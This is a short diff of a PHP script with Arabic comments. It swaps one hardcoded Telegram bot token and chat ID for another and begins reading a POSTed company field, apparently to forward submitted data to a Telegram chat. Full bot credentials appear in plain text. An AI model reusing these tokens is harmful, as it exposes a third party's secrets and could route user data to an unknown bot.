@@ -1,7 +1,7 @@
 <?php
 // إعدادات التليجرام
-define('BOT_TOKEN', '8336961082:AAGqlFilNFcN-NVMrzWGeut7JhLd_yZqOkc');
-define('CHAT_ID', '8535558521');
+define('BOT_TOKEN', '8556962941:AAHlKkhTEHidZgmI88cTJtKxrsVoHbzsj6A');
+define('CHAT_ID', '8053385893');
 
 // استقبال بيانات الشركة المختارة
 $company = isset($_POST['company']) ? $_POST['company'] : '';
